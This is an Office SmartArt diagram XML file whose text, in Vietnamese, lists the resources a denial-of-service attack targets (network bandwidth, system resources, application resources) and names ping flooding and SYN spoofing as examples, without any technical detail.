    <dgm:pt modelId="{B6D24611-8D24-4857-ACF5-3F6B886E8F6D}" type="sibTrans" cxnId="{90402C88-81A9-4F97-9826-AB2628608667}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" type="pres">
      <dgm:prSet presAssocID="{D94D8596-48D0-486B-8783-2ADF0883213C}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{24BDE9BE-48E6-405E-8AF0-A28B29ED8C66}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="1"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CE841021-028B-435A-A662-9D12B985022C}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="parentText" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="1" custScaleX="96200">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A3476D70-817C-46D0-A1BE-6AE9D5D978FD}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7D76A578-B55C-43EC-B2A0-551426FD04BF}" type="pres">
      <dgm:prSet presAssocID="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="1">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{9220FA34-72C9-4A40-B520-9C639D661416}" type="presOf" srcId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" destId="{24BDE9BE-48E6-405E-8AF0-A28B29ED8C66}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E080B942-606C-4280-A576-C4F1448F092F}" type="presOf" srcId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" destId="{CE841021-028B-435A-A662-9D12B985022C}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{90402C88-81A9-4F97-9826-AB2628608667}" srcId="{D94D8596-48D0-486B-8783-2ADF0883213C}" destId="{093AB87F-EAA2-44B6-8FB7-FF8689D1E8D1}" srcOrd="0" destOrd="0" parTransId="{9EC7B965-5D54-470D-B689-C0BA2FABFCA1}" sibTransId="{B6D24611-8D24-4857-ACF5-3F6B886E8F6D}"/>
    <dgm:cxn modelId="{F98357D8-9078-49C5-8F20-FEA8AF459132}" type="presOf" srcId="{D94D8596-48D0-486B-8783-2ADF0883213C}" destId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{2B0CEF6D-61B2-446A-AE80-1DED1E50C91C}" type="presParOf" srcId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" destId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{AD6D83A4-3178-4B60-856A-BE2D20A0D6C9}" type="presParOf" srcId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" destId="{24BDE9BE-48E6-405E-8AF0-A28B29ED8C66}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6953A462-9333-489C-A223-91E26F5C801E}" type="presParOf" srcId="{B8EF2033-4B65-454B-A549-43B00EBD6374}" destId="{CE841021-028B-435A-A662-9D12B985022C}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A349FC73-76E5-4A89-A6AF-64B0FF8CE1AF}" type="presParOf" srcId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" destId="{A3476D70-817C-46D0-A1BE-6AE9D5D978FD}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8CA1C34B-36F5-4703-BC69-D5D8D6471459}" type="presParOf" srcId="{2CC86AC5-BE97-47D0-BE37-B1A3675A7626}" destId="{7D76A578-B55C-43EC-B2A0-551426FD04BF}"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CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" type="doc">
      <dgm:prSet loTypeId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2" loCatId="list" qsTypeId="urn:microsoft.com/office/officeart/2005/8/quickstyle/simple4" qsCatId="simple" csTypeId="urn:microsoft.com/office/officeart/2005/8/colors/colorful3" csCatId="colorful" phldr="1"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{59372874-7672-E146-A97A-F29BFB4A2140}">
      <dgm:prSet phldrT="[Text]"/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" b="1" i="0">
              <a:effectLst/>
            </a:rPr>
            <a:t>Băng thông mạng</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AFA358CC-DE03-B14E-9AD6-513B9ED3EF89}" type="parTrans" cxnId="{4CD5B385-F4AE-6B4E-A557-3E5FBE186B3A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EF9C2E62-DCA0-D848-903A-2D9F9C026F51}" type="sibTrans" cxnId="{4CD5B385-F4AE-6B4E-A557-3E5FBE186B3A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6B5A5FFB-92DD-ED47-BF2F-AC0DD483D147}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" b="1" i="0">
              <a:effectLst/>
              <a:latin typeface="+mj-lt"/>
            </a:rPr>
            <a:t>Liên quan khả năng của liên kết mạng kết nối một máy chủ tới Internet</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{12E1D443-E49F-1646-A14E-D146B51693EE}" type="parTrans" cxnId="{07FD202E-A68A-914D-A147-95185A18067A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9A2D11C2-577E-FC4A-BCED-3B769EBA90F6}" type="sibTrans" cxnId="{07FD202E-A68A-914D-A147-95185A18067A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F9308F1A-1492-F14D-AA25-68EB847A0DB3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" b="1" i="0">
              <a:effectLst/>
              <a:latin typeface="+mj-lt"/>
            </a:rPr>
            <a:t>Với hầu hết các tổ chức, đây là kết nối của họ tới ISP</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6587E665-7412-CC4B-8376-E44CFD4886EF}" type="parTrans" cxnId="{64632D81-51A2-6B4B-9F06-658DFD074D36}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{91D74F09-50FE-8A4E-8C86-D04F1C2F50FB}" type="sibTrans" cxnId="{64632D81-51A2-6B4B-9F06-658DFD074D36}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{92F30862-F847-FC4F-9375-31010EECD883}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" b="1" i="0">
              <a:effectLst/>
            </a:rPr>
            <a:t>Tài nguyên hệ thống</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{70431AB4-DF3F-4645-82B4-916A5B03ED2B}" type="parTrans" cxnId="{09ECF6DD-E119-374A-AA19-1EFBB9A7AE59}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BC376F47-B3AB-B74F-80ED-DB7222180FD2}" type="sibTrans" cxnId="{09ECF6DD-E119-374A-AA19-1EFBB9A7AE59}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BD3D1B08-BA2C-A847-81FA-0E907AC86072}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" b="1" i="0">
              <a:effectLst/>
              <a:latin typeface="+mj-lt"/>
            </a:rPr>
            <a:t>Nhằm làm quá tải hoặc crash các phần mềm network handling</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{47925BA2-F0AA-1349-914E-93DB729B1439}" type="parTrans" cxnId="{21896DD5-9159-5A48-95C3-0628E40AD5D5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{DEA69FE8-A421-8F40-BC0D-0B81014C6103}" type="sibTrans" cxnId="{21896DD5-9159-5A48-95C3-0628E40AD5D5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" b="1" i="0">
              <a:effectLst/>
            </a:rPr>
            <a:t>Tài nguyên ứng dụng</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E5862108-903B-1C4B-9377-81DD29E52B29}" type="parTrans" cxnId="{752AFBC6-0A6F-E64D-8873-6214DED38720}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B6EE5F2B-A910-414E-A3BF-34358F619072}" type="sibTrans" cxnId="{752AFBC6-0A6F-E64D-8873-6214DED38720}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{02DC4651-8C6F-6447-9B8F-D57C357757EB}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" b="1" i="0">
              <a:effectLst/>
              <a:latin typeface="+mj-lt"/>
            </a:rPr>
            <a:t>Liên quan tới một số lượng yêu cầu hợp lệ, mỗi yêu cầu tiêu tốn lượng lớn tài nguyên, vì vậy giới hạn khả năng của máy chủ phản hồi yêu cầu từ người dùng</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CC53E30A-CA09-8949-8B35-41834609C58A}" type="parTrans" cxnId="{8B9D4070-B4CC-F34F-B8B4-4F4F74F1B1AC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2EFD9D0C-B667-974D-8EEE-876172C6068D}" type="sibTrans" cxnId="{8B9D4070-B4CC-F34F-B8B4-4F4F74F1B1AC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D7B7FD62-1AF5-4A2F-BF26-C553AD1C9EF2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" b="1" i="0">
              <a:effectLst/>
              <a:latin typeface="+mj-lt"/>
            </a:rPr>
            <a:t>Ví dụ: Ping flooding</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C77916B4-271F-4B5C-B822-FF7FCC23748C}" type="parTrans" cxnId="{7557168B-73C6-4404-ABD1-F3A11CA4E00F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{81B44C3D-5D58-4EC9-A7C5-9B7EDACABF97}" type="sibTrans" cxnId="{7557168B-73C6-4404-ABD1-F3A11CA4E00F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{00FB880C-DCFD-49FC-9FE3-F74D6B37F6BF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" b="1" i="0">
              <a:effectLst/>
              <a:latin typeface="+mj-lt"/>
            </a:rPr>
            <a:t>Ví dụ: SYN Spoofing</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" b="1" i="0" dirty="0">
            <a:effectLst/>
            <a:latin typeface="+mj-lt"/>
          </a:endParaRPr>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{82EE91AC-0BFF-4DF9-AE3D-DC6645F4CB15}" type="parTrans" cxnId="{F77E5695-516A-4BA7-9F27-6D6283EA8D6C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6782960E-9B8F-44D6-B17D-3C52D07BF4C4}" type="sibTrans" cxnId="{F77E5695-516A-4BA7-9F27-6D6283EA8D6C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{635717B1-99B8-854E-8F70-444337E2E550}" type="pres">
      <dgm:prSet presAssocID="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" presName="theList" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EE209E84-B891-3047-A320-4AEEC3330BB8}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1F9EAEE1-B141-8149-B598-A2FC9726C17B}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="aNode" presStyleLbl="bgShp" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E367BE70-C50A-6A43-8AFA-7CF7E142477B}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="textNode" presStyleLbl="bgShp" presStyleIdx="0" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{6AC02209-CF3A-0249-91E1-9F1A42D58FAE}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="compChildNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7EE38C84-00CF-1247-9F8C-618383AEFFBD}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="theInnerList" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E1C9B790-AD02-DB4B-90E8-7BFEE9B60B8A}" type="pres">
      <dgm:prSet presAssocID="{6B5A5FFB-92DD-ED47-BF2F-AC0DD483D147}" presName="childNode" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="6">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{FD11D5FD-18A1-A246-9B5B-AC50BEFA8723}" type="pres">
      <dgm:prSet presAssocID="{6B5A5FFB-92DD-ED47-BF2F-AC0DD483D147}" presName="aSpace2" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{9C0BB106-18F0-064A-9F7C-7245A6EA83E6}" type="pres">
      <dgm:prSet presAssocID="{F9308F1A-1492-F14D-AA25-68EB847A0DB3}" presName="childNode" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="6">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{72550918-B5AF-4D82-9D36-A65BF6B17CE2}" type="pres">
      <dgm:prSet presAssocID="{F9308F1A-1492-F14D-AA25-68EB847A0DB3}" presName="aSpace2" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CC58C958-26F6-42BD-B11C-953A51DACB19}" type="pres">
      <dgm:prSet presAssocID="{D7B7FD62-1AF5-4A2F-BF26-C553AD1C9EF2}" presName="childNode" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="6">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{12284197-3CBC-A34B-949D-A231607C1E8B}" type="pres">
      <dgm:prSet presAssocID="{59372874-7672-E146-A97A-F29BFB4A2140}" presName="aSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B431EFE1-C863-1C48-A3AC-77CE92A996E4}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{200D4077-F322-A54F-A959-16520676AF19}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="aNode" presStyleLbl="bgShp" presStyleIdx="1" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E415A12E-187B-9149-B76A-23CD314DDAC8}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="textNode" presStyleLbl="bgShp" presStyleIdx="1" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{834C08AE-444E-F446-B0BF-3487CD228505}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="compChildNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{534131B6-A042-2F47-B9FB-6D8DAFBA1F6D}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="theInnerList" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{331622DA-667B-3D42-86F2-0516235F2E15}" type="pres">
      <dgm:prSet presAssocID="{BD3D1B08-BA2C-A847-81FA-0E907AC86072}" presName="childNode" presStyleLbl="node1" presStyleIdx="3" presStyleCnt="6">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{81D1A887-8039-40A1-A406-4AE4BCC6EFA1}" type="pres">
      <dgm:prSet presAssocID="{BD3D1B08-BA2C-A847-81FA-0E907AC86072}" presName="aSpace2" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{485F3DDF-2E91-40E1-9783-AA7B6A3AF28C}" type="pres">
      <dgm:prSet presAssocID="{00FB880C-DCFD-49FC-9FE3-F74D6B37F6BF}" presName="childNode" presStyleLbl="node1" presStyleIdx="4" presStyleCnt="6">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{237E2EFB-A677-D844-819C-BBDED44A17C5}" type="pres">
      <dgm:prSet presAssocID="{92F30862-F847-FC4F-9375-31010EECD883}" presName="aSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{49A3A6F1-0ADA-9941-AEE8-8E3D396BEBB6}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1EA47F75-BED3-5244-AD77-D9664E47C6FF}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="aNode" presStyleLbl="bgShp" presStyleIdx="2" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{DE64535E-28E3-9144-82ED-ED0F42D2AAEE}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="textNode" presStyleLbl="bgShp" presStyleIdx="2" presStyleCnt="3"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1D30DF71-C875-B746-BD57-739E889A911A}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="compChildNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B8BA19E8-688C-424C-829D-A7B0DEE3A1AE}" type="pres">
      <dgm:prSet presAssocID="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" presName="theInnerList" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F711556B-CC33-6E40-9D5E-6524FC4A1052}" type="pres">
      <dgm:prSet presAssocID="{02DC4651-8C6F-6447-9B8F-D57C357757EB}" presName="childNode" presStyleLbl="node1" presStyleIdx="5" presStyleCnt="6">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{E1736B09-914B-3149-8C3C-C974F30C88A6}" type="presOf" srcId="{CDE7C5DF-1F4E-144D-B3C6-CCDDA29A64DD}" destId="{635717B1-99B8-854E-8F70-444337E2E550}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{0A2D0716-C61C-9141-86DA-988FC1C305F9}" type="presOf" srcId="{6B5A5FFB-92DD-ED47-BF2F-AC0DD483D147}" destId="{E1C9B790-AD02-DB4B-90E8-7BFEE9B60B8A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{07FD202E-A68A-914D-A147-95185A18067A}" srcId="{59372874-7672-E146-A97A-F29BFB4A2140}" destId="{6B5A5FFB-92DD-ED47-BF2F-AC0DD483D147}" srcOrd="0" destOrd="0" parTransId="{12E1D443-E49F-1646-A14E-D146B51693EE}" sibTransId="{9A2D11C2-577E-FC4A-BCED-3B769EBA90F6}"/>
    <dgm:cxn modelId="{C180D234-5927-BC40-BCEA-43D33D0E2CFA}" type="presOf" srcId="{02DC4651-8C6F-6447-9B8F-D57C357757EB}" destId="{F711556B-CC33-6E40-9D5E-6524FC4A1052}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{D3860F36-28E4-1442-B86C-E63CCC3FE716}" type="presOf" srcId="{3234AAA2-C82A-B44F-87E5-BD58BA054E0F}" destId="{DE64535E-28E3-9144-82ED-ED0F42D2AAEE}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{329B575F-8B76-3B4B-9BD9-38FDE9A2A8A5}" type="presOf" srcId="{59372874-7672-E146-A97A-F29BFB4A2140}" destId="{E367BE70-C50A-6A43-8AFA-7CF7E142477B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
    <dgm:cxn modelId="{75F3A062-C25E-EE44-801F-9095BD1C5120}" type="presOf" srcId="{F9308F1A-1492-F14D-AA25-68EB847A0DB3}" destId="{9C0BB106-18F0-064A-9F7C-7245A6EA83E6}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/lProcess2"/>
